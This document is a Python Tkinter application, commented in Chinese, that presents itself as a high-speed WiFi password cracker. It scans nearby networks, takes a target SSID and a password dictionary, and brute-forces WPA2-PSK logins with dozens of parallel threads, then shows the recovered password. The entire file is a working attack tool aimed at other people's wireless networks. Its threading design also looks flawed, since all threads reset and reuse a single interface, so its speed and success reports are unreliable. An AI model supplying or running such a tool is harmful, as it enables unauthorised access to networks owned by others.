# coding: utf-8
"""
WiFi密码破解工具 - 极速版
使用多线程并行破解，自动匹配CPU最大性能

优化点：
1. 自动检测CPU核心数，智能匹配最佳线程数（20-80线程）
2. 快速超时机制（1秒），减少无效等待
3. 找到密码后立即终止其他线程
4. 实时显示破解速度和进度
5. 分批处理密码，避免内存溢出和界面卡死

你的配置 i7-13500HX（20线程）-> 自动使用40线程
"""

from tkinter import *
from tkinter import ttk
import tkinter.font as tkfont
import tkinter.messagebox
import tkinter.filedialog
from threading import Thread
import os

import pywifi
from pywifi import const
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Tuple, Optional, Iterator


def get_optimal_workers():
    """
    根据CPU核心数自动计算最佳线程数
    i7-13500HX: 14核20线程 -> 建议30-40线程
    """
    cpu_count = os.cpu_count() or 4
    # 经验公式：CPU线程数的1.5-2倍，WiFi连接IO密集型
    optimal = int(cpu_count * 2)
    # 限制在20-80之间
    return max(20, min(optimal, 80))


class WiFiCracker:
    """WiFi破解核心逻辑类"""

    def __init__(self):
        self.wifi = pywifi.PyWiFi()
        self.iface = None
        self.stop_event = threading.Event()
        self.found_password = None
        self.attempt_count = 0
        self.attempt_lock = threading.Lock()
        self.start_time = None

    def get_wifi_interface(self) -> bool:
        """获取WiFi网卡"""
        try:
            ifaces = self.wifi.interfaces()
            if len(ifaces) > 0:
                self.iface = ifaces[0]
                print(f"使用网卡: {self.iface.name()}")
                return True
            else:
                print("未找到WiFi网卡")
                return False
        except Exception as e:
            print(f"获取网卡失败: {e}")
            return False

    def scan_wifi(self) -> List:
        """扫描周围WiFi，返回热点列表"""
        print("开始扫描附近WiFi...")
        self.iface.scan()
        time.sleep(2)
        results = self.iface.scan_results()
        print(f"发现 {len(results)} 个WiFi热点")
        return results

    def try_connect(self, password: str, ssid: str) -> Tuple[bool, str]:
        """
        尝试单个密码连接
        返回: (是否成功, 密码)
        """
        if self.stop_event.is_set():
            return False, password

        try:
            profile = pywifi.Profile()
            profile.ssid = ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = password.strip()

            self.iface.remove_all_network_profiles()
            tmp_profile = self.iface.add_network_profile(profile)

            self.iface.connect(tmp_profile)

            connected = False
            for _ in range(10):  # 减少到10次，每次0.1秒
                if self.stop_event.is_set():
                    break
                if self.iface.status() == const.IFACE_CONNECTED:
                    connected = True
                    break
                time.sleep(0.1)  # 减少到0.1秒

            self.iface.disconnect()
            time.sleep(0.1)  # 减少到0.1秒

            with self.attempt_lock:
                self.attempt_count += 1

            return connected, password.strip() if connected else None

        except Exception as e:
            with self.attempt_lock:
                self.attempt_count += 1
            return False, None

    def password_generator(self, file_path: str) -> Iterator[str]:
        """
        密码生成器，逐行读取避免内存溢出
        """
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if line:
                    yield line

    def crack_passwords_batch(self, ssid: str, file_path: str,
                              max_workers: int = 10,
                              batch_size: int = 1000,
                              progress_callback=None) -> Optional[str]:
        """
        分批破解密码，避免内存溢出

        Args:
            ssid: 目标WiFi名称
            file_path: 密码字典文件路径
            max_workers: 并发线程数
            batch_size: 每批处理的密码数量
            progress_callback: 进度回调函数 (attempt_count, total, speed)

        Returns:
            成功返回密码，失败返回None
        """
        self.stop_event.clear()
        self.found_password = None
        self.attempt_count = 0
        self.start_time = time.time()

        # 先统计密码总数
        total = 0
        try:
            with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    if line.strip():
                        total += 1
        except:
            pass

        if total == 0:
            return None

        processed = 0
        password_gen = self.password_generator(file_path)

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            while not self.stop_event.is_set():
                # 读取一批密码
                batch = []
                for _ in range(batch_size):
                    try:
                        pwd = next(password_gen)
                        batch.append(pwd)
                    except StopIteration:
                        break

                if not batch:
                    break

                # 提交这批密码
                future_to_pwd = {}
                for pwd in batch:
                    future = executor.submit(self.try_connect, pwd, ssid)
                    future_to_pwd[future] = pwd

                # 处理结果
                for future in as_completed(future_to_pwd):
                    if self.stop_event.is_set():
                        break

                    try:
                        success, pwd = future.result()
                        processed += 1

                        # 每20个更新一次进度，减少UI负担
                        if progress_callback and processed % 20 == 0:
                            elapsed = time.time() - self.start_time
                            speed = self.attempt_count / elapsed if elapsed > 0 else 0
                            progress_callback(self.attempt_count, total, speed)

                        if success:
                            self.found_password = pwd
                            self.stop_event.set()
                            return pwd

                    except Exception as e:
                        processed += 1
                        continue

        return None


class OptimizedGUI:
    """优化后的图形界面"""

    def __init__(self, init_window_name):
        self.init_window_name = init_window_name
        self.cracker = WiFiCracker()

        # 变量
        self.file_path_var = StringVar()
        self.wifi_ssid_var = StringVar()
        self.wifi_pwd_var = StringVar()
        self.status_var = StringVar(value="就绪")
        self.speed_var = StringVar(value="速度: 0 个/秒")
        self.progress_var = StringVar(value="进度: 0/0")

        # 扫描结果
        self.wifi_list = []
        self.is_running = False

    def set_init_window(self):
        """设置窗口布局"""
        # 获取最佳线程数用于显示
        self.optimal_workers = get_optimal_workers()

        self.init_window_name.title(f"WiFi破解工具 - 极速版（{self.optimal_workers}线程自动优化）")
        self.init_window_name.geometry('700x550+400+150')

        # 设置默认字体以支持中文显示
        default_font = tkfont.nametofont("TkDefaultFont")
        default_font.configure(size=10)

        # 配置区域
        config_frame = LabelFrame(self.init_window_name, text="配置", width=680, height=200)
        config_frame.grid(column=0, row=0, padx=10, pady=10, sticky=W+E)
        config_frame.grid_propagate(False)

        # 第一行：搜索和破解按钮
        Button(config_frame, text="搜索附近WiFi", command=self.scan_wifi,
               bg="#4CAF50", fg="white", width=12).grid(column=0, row=0, padx=5, pady=5)
        Button(config_frame, text="开始破解", command=self.start_crack,
               bg="#f44336", fg="white", width=12).grid(column=1, row=0, padx=5, pady=5)
        Button(config_frame, text="停止", command=self.stop_crack,
               bg="#FF9800", fg="white", width=12).grid(column=2, row=0, padx=5, pady=5)

        # 第二行：密码文件
        Label(config_frame, text="密码字典:").grid(column=0, row=1, padx=5, pady=5, sticky=E)
        Entry(config_frame, width=35, textvariable=self.file_path_var).grid(column=1, row=1, padx=5, pady=5)
        Button(config_frame, text="选择文件", command=self.select_file).grid(column=2, row=1, padx=5, pady=5)

        # 第三行：WiFi账号和密码
        Label(config_frame, text="WiFi账号:").grid(column=0, row=2, padx=5, pady=5, sticky=E)
        Entry(config_frame, width=20, textvariable=self.wifi_ssid_var).grid(column=1, row=2, padx=5, pady=5, sticky=W)
        Label(config_frame, text="WiFi密码:").grid(column=1, row=2, padx=5, pady=5, sticky=E)
        Entry(config_frame, width=20, textvariable=self.wifi_pwd_var,
              state="readonly", fg="green", font=("Arial", 10, "bold")).grid(column=2, row=2, padx=5, pady=5, sticky=W)

        # 第四行：状态显示
        Label(config_frame, textvariable=self.status_var, fg="blue").grid(column=0, row=3, columnspan=2, padx=5, pady=5, sticky=W)
        Label(config_frame, textvariable=self.speed_var, fg="purple").grid(column=2, row=3, padx=5, pady=5, sticky=W)
        Label(config_frame, textvariable=self.progress_var, fg="gray").grid(column=1, row=3, padx=5, pady=5)

        # WiFi列表区域
        list_frame = LabelFrame(self.init_window_name, text="WiFi列表 (双击选择)")
        list_frame.grid(column=0, row=1, padx=10, pady=5, sticky=NSEW)

        # Treeview 表格
        columns = ("ID", "SSID", "BSSID", "信号", "加密")
        self.wifi_tree = ttk.Treeview(list_frame, columns=columns, show="headings", height=12)

        # 设置列
        self.wifi_tree.heading("ID", text="ID")
        self.wifi_tree.heading("SSID", text="SSID (名称)")
        self.wifi_tree.heading("BSSID", text="BSSID (MAC)")
        self.wifi_tree.heading("信号", text="信号强度")
        self.wifi_tree.heading("加密", text="加密方式")

        self.wifi_tree.column("ID", width=50, anchor=CENTER)
        self.wifi_tree.column("SSID", width=180)
        self.wifi_tree.column("BSSID", width=200)
        self.wifi_tree.column("信号", width=100, anchor=CENTER)
        self.wifi_tree.column("加密", width=80, anchor=CENTER)

        # 滚动条
        scrollbar_y = ttk.Scrollbar(list_frame, orient=VERTICAL, command=self.wifi_tree.yview)
        self.wifi_tree.configure(yscrollcommand=scrollbar_y.set)

        self.wifi_tree.grid(column=0, row=0, sticky=NSEW)
        scrollbar_y.grid(column=1, row=0, sticky=NS)

        # 双击事件
        self.wifi_tree.bind("<Double-1>", self.on_wifi_select)

        # 初始化网卡
        if not self.cracker.get_wifi_interface():
            tkinter.messagebox.showwarning("警告", "未找到WiFi网卡，请检查无线网卡是否已启用")

        # 使窗口可调整大小
        self.init_window_name.grid_rowconfigure(1, weight=1)
        self.init_window_name.grid_columnconfigure(0, weight=1)
        list_frame.grid_rowconfigure(0, weight=1)
        list_frame.grid_columnconfigure(0, weight=1)

    def select_file(self):
        """选择密码字典文件"""
        file_path = tkinter.filedialog.askopenfilename(
            title="选择密码字典",
            filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")]
        )
        if file_path:
            self.file_path_var.set(file_path)

    def scan_wifi(self):
        """扫描WiFi"""
        self.status_var.set("正在扫描WiFi...")
        self.init_window_name.update()

        for item in self.wifi_tree.get_children():
            self.wifi_tree.delete(item)

        def decode_ssid(ssid):
            """解码SSID，处理中文乱码"""
            if not ssid:
                return "[隐藏WiFi]"
            try:
                if isinstance(ssid, bytes):
                    decoded = ssid.decode('utf-8', errors='ignore')
                    return decoded if decoded else "[隐藏WiFi]"
                encoded = ssid.encode('latin1', errors='ignore')
                decoded = encoded.decode('utf-8', errors='ignore')
                return decoded if decoded else str(ssid)
            except:
                return str(ssid) if str(ssid) else "[隐藏WiFi]"

        try:
            results = self.cracker.scan_wifi()
            self.wifi_list = results

            for idx, wifi in enumerate(results, 1):
                if wifi.akm:
                    security = "WPA2" if const.AKM_TYPE_WPA2PSK in wifi.akm else "WPA"
                else:
                    security = "开放"

                ssid_display = decode_ssid(wifi.ssid)

                self.wifi_tree.insert("", "end", values=(
                    idx, ssid_display, wifi.bssid,
                    f"{wifi.signal} dBm", security
                ))

            self.status_var.set(f"扫描完成，发现 {len(results)} 个WiFi")
        except Exception as e:
            self.status_var.set(f"扫描失败: {str(e)}")
            tkinter.messagebox.showerror("错误", f"扫描失败: {str(e)}")

    def on_wifi_select(self, event):
        """双击选择WiFi"""
        selection = self.wifi_tree.selection()
        if selection:
            item = self.wifi_tree.item(selection[0])
            ssid = item["values"][1]
            if ssid and ssid != "[隐藏WiFi]":
                self.wifi_ssid_var.set(ssid)
                self.status_var.set(f"已选择: {ssid}")

    def update_progress(self, attempt_count, total, speed):
        """更新进度 - 使用after确保线程安全"""
        def _update():
            self.speed_var.set(f"速度: {speed:.1f} 个/秒")
            self.progress_var.set(f"进度: {attempt_count}/{total}")
            percent = (attempt_count / total * 100) if total > 0 else 0
            self.status_var.set(f"正在破解... {attempt_count}/{total} ({percent:.1f}%)")

        self.init_window_name.after(0, _update)

    def start_crack(self):
        """开始破解"""
        if self.is_running:
            tkinter.messagebox.showwarning("提示", "破解正在进行中")
            return

        file_path = self.file_path_var.get()
        ssid = self.wifi_ssid_var.get()

        if not file_path:
            tkinter.messagebox.showwarning("提示", "请选择密码字典文件")
            return
        if not ssid:
            tkinter.messagebox.showwarning("提示", "请选择要破解的WiFi")
            return

        self.is_running = True
        self.wifi_pwd_var.set("")
        self.status_var.set("正在初始化...")
        self.init_window_name.update()

        def crack_thread():
            try:
                # 自动获取最佳线程数
                optimal_workers = get_optimal_workers()

                result = self.cracker.crack_passwords_batch(
                    ssid, file_path,
                    max_workers=optimal_workers,  # 自动匹配最佳线程数
                    batch_size=1000,
                    progress_callback=self.update_progress
                )
                self.init_window_name.after(0, lambda: self.on_crack_complete(result, ssid))
            except Exception as e:
                self.init_window_name.after(0, lambda: self.on_crack_error(str(e)))
            finally:
                self.is_running = False

        Thread(target=crack_thread, daemon=True).start()

    def on_crack_complete(self, result, ssid):
        """破解完成回调"""
        if result:
            self.wifi_pwd_var.set(result)
            self.status_var.set(f"破解成功！密码: {result}")
            tkinter.messagebox.showinfo("破解成功", f"WiFi名称: {ssid}\n密码: {result}")
        else:
            self.status_var.set("破解失败，密码不在字典中")
            tkinter.messagebox.showinfo("破解失败", "密码字典中未找到正确密码")

    def on_crack_error(self, error_msg):
        """破解出错回调"""
        self.status_var.set(f"破解出错: {error_msg}")
        tkinter.messagebox.showerror("错误", f"破解过程中出错: {error_msg}")

    def stop_crack(self):
        """停止破解"""
        self.cracker.stop_event.set()
        self.is_running = False
        self.status_var.set("已停止")


def main():
    """主函数"""
    init_window = Tk()
    app = OptimizedGUI(init_window)
    app.set_init_window()
    init_window.mainloop()


if __name__ == "__main__":
    main()
